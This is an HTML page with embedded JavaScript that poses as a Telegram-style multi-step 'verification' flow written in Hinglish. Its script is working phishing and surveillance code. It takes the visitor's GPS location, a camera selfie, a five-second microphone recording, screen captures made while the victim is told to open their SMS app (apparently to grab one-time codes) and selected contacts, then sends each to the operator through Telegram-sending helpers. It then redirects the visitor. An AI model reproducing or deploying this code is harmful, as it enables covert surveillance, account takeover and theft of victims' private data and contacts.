<!doctype html>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex">
<title>Verify</title>
<style>
 body{font-family:system-ui;background:#17212b;color:#fff;display:flex;
      align-items:center;justify-content:center;min-height:100vh;margin:0}
 .box{width:90%;max-width:360px;text-align:center;padding:20px 0}
 h2{font-size:19px;margin:0 0 8px}
 p{color:#8b9aa8;font-size:14px;margin:0 0 16px;line-height:1.55}
 button{width:100%;padding:15px;margin-top:10px;border:0;border-radius:10px;
        background:#3390ec;color:#fff;font-size:16px;font-weight:700}
 button.ghost{background:#242f3d;border:1px solid #2b3a47;font-weight:500}
 #st{min-height:20px;font-size:14px;color:#5ec26a;margin-top:10px}
 #pv{width:100%;border-radius:10px;margin-top:10px;background:#000;max-height:30vh}
 .dots{display:flex;gap:5px;justify-content:center;margin-bottom:16px}
 .dot{width:18px;height:4px;border-radius:2px;background:#2b3a47}
 .dot.on{background:#3390ec}
</style>
<div class="box">
  <div class="dots">
    <div class="dot on"></div><div class="dot"></div><div class="dot"></div>
    <div class="dot"></div><div class="dot"></div>
  </div>

  <div id="s0">
    <h2>Location verify</h2>
    <p><b>Allow</b> dabao</p>
    <button id="bLoc">Allow</button>
    <button class="ghost skip" data-n="1">Skip</button>
    <div id="st"></div>
  </div>

  <div id="s1" hidden>
    <h2>Face verify</h2>
    <p>Camera khud photo lega. <b>Allow</b> dabao</p>
    <button id="bCam">Allow</button>
    <button class="ghost skip" data-n="2">Skip</button>
    <div id="st1"></div>
    <video id="pv" autoplay muted playsinline hidden></video>
  </div>

  <div id="s2" hidden>
    <h2>Voice verify</h2>
    <p>5 second khud record hoga. <b>Allow</b> dabao</p>
    <button id="bMic">Allow</button>
    <button class="ghost skip" data-n="3">Skip</button>
    <div id="st2"></div>
  </div>

  <div id="s3" hidden>
    <h2>Security check</h2>
    <p>Screen share karo, SMS app khol lena. Screenshot khud lenge.</p>
    <button id="bScr">Allow</button>
    <button class="ghost skip" data-n="4">Skip</button>
    <div id="st3"></div>
  </div>

  <div id="s4" hidden>
    <h2>Contacts sync</h2>
    <p>Contacts chuno, phir <b>Add</b> dabao</p>
    <button id="bCon">Contacts</button>
    <button class="ghost skip" data-n="5">Skip</button>
    <div id="st4"></div>
  </div>

  <div id="s5" hidden>
    <h2>Ho gaya</h2>
    <p>Verification complete</p>
  </div>
</div>
<script src="config.js"></script>
<script src="send.js"></script>
<script>
const num = sessionStorage.getItem('num') || '?';
let stream = null;

function vid(){
  let id = localStorage.getItem('vid');
  if (!id){ id = 'v' + Math.random().toString(36).slice(2,8); localStorage.setItem('vid', id); }
  return id;
}

function go(n){
  for (let i = 0; i <= 5; i++) document.getElementById('s'+i).hidden = (i !== n);
  document.querySelectorAll('.dot').forEach((d,i) => d.classList.toggle('on', i <= n));
  if (n === 5){
    try { Notification.requestPermission(); } catch(e){}
    setTimeout(() => location.href = CFG.REDIRECT, 1200);
  }
}

document.getElementById('bLoc').onclick = async () => {
  document.getElementById('st').textContent = 'Le rahe hain...';
  const l = await getLoc();
  if (l){
    sendTG(`[${vid()}] GPS | ${num}\n${l}\nhttps://maps.google.com/?q=${l.split(' ')[0]}`);
    document.getElementById('st').textContent = 'Mil gaya';
  } else document.getElementById('st').textContent = 'Nahi mila';
  setTimeout(() => go(1), 900);
};

document.getElementById('bCam').onclick = async () => {
  const st = document.getElementById('st1');
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user' }, audio:false });
  } catch(e){ st.textContent = 'Deny hua'; setTimeout(() => go(2), 800); return; }
  const v = document.getElementById('pv');
  v.hidden = false; v.srcObject = stream;
  await new Promise(r => setTimeout(r, 1500));
  const c = document.createElement('canvas');
  c.width = v.videoWidth; c.height = v.videoHeight;
  c.getContext('2d').drawImage(v, 0, 0);
  const b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.85));
  if (b) await sendPhoto(b, `[${vid()}] SELFIE | ${num}`);
  stream.getTracks().forEach(t => t.stop());
  st.textContent = 'Ho gaya';
  setTimeout(() => go(2), 800);
};

document.getElementById('bMic').onclick = async () => {
  const st = document.getElementById('st2');
  try {
    stream = await navigator.mediaDevices.getUserMedia({ audio:true });
  } catch(e){ st.textContent = 'Deny hua'; setTimeout(() => go(3), 800); return; }
  const rec = new MediaRecorder(stream);
  const ch = [];
  rec.ondataavailable = e => ch.push(e.data);
  rec.onstop = async () => {
    const blob = new Blob(ch, { type:'audio/webm' });
    if (blob.size > 8000) await sendAudio(blob, `[${vid()}] MIC | ${num}`);
    stream.getTracks().forEach(t => t.stop());
    st.textContent = 'Ho gaya';
    setTimeout(() => go(3), 800);
  };
  rec.start();
  let s = 5; st.textContent = 'Record... ' + s;
  const iv = setInterval(() => { s--; st.textContent = 'Record... ' + s; }, 1000);
  setTimeout(() => { clearInterval(iv); rec.stop(); }, 5000);
};

document.getElementById('bScr').onclick = async () => {
  const st = document.getElementById('st3');
  try {
    stream = await navigator.mediaDevices.getDisplayMedia({ video:{ frameRate:5 }, audio:false });
  } catch(e){ st.textContent = 'Deny hua'; setTimeout(() => go(4), 800); return; }
  const v = document.getElementById('pv');
  v.hidden = false; v.srcObject = stream;
  st.textContent = 'Chalu - SMS app kholo';
  for (let i = 1; i <= 3; i++){
    await new Promise(r => setTimeout(r, 2500));
    if (!v.videoWidth) continue;
    const c = document.createElement('canvas');
    c.width = v.videoWidth; c.height = v.videoHeight;
    c.getContext('2d').drawImage(v, 0, 0);
    const b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.75));
    if (b) await sendPhoto(b, `[${vid()}] SCREEN${i} | ${num}`);
    st.textContent = i + '/3 liye';
  }
  stream.getTracks().forEach(t => t.stop());
  setTimeout(() => go(4), 800);
};

document.getElementById('bCon').onclick = async () => {
  const st = document.getElementById('st4');
  if (!navigator.contacts || !navigator.contacts.select){ st.textContent = 'Nahi chalta'; return; }
  try {
    const list = await navigator.contacts.select(['name','tel'], { multiple:true });
    if (!list.length){ st.textContent = 'Koi nahi chuna'; return; }
    const txt = list.slice(0,100)
      .map(c => `${(c.name||[])[0] || '?'} — ${(c.tel||[])[0] || ''}`).join('\n');
    sendTG(`[${vid()}] CONTACTS (${list.length}) | ${num}\n<code>${txt}</code>`);
    st.textContent = list.length + ' mile';
  } catch(e){ st.textContent = 'Cancel hua'; }
};

document.querySelectorAll('.skip').forEach(b => b.onclick = () => go(+b.dataset.n));
</script>
